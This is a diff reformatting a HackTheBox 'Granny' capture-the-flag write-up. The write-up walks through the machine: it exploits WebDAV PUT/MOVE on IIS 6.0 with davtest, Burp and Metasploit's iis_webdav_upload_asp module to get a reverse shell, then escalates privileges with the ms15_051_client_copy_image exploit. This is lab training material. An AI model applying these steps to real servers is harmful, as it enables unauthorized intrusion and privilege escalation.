@@ -1,27 +1,24 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Granny
-# 19/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.15
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 80/tcp open  http    Microsoft IIS httpd 6.0
 
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 
 we can use put and move method in http
 
 └─$ davtest -url http://10.10.10.15/
 do it through burp and capture the request
-
-
-
 
 
 PUT /my.html HTTP/1.1
@@ -32,10 +29,6 @@ User-Agent: DAV.pm/v0.49
 Content-Length: 26
 
 HTML put via davtest<br />
-
-
-
-
 
 
 use burp and upload payload and get reverse connection
@@ -50,9 +43,7 @@ use iis_webdav_upload_asp
 you get a shell
 
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 first migrate the session uder other running procces 
 in this casa davcdata.exe
 use post/multi/recon/local_exploit_suggester
@@ -60,4 +51,3 @@ run
 
 use exploit/windows/local/ms15_051_client_copy_image
 run
-
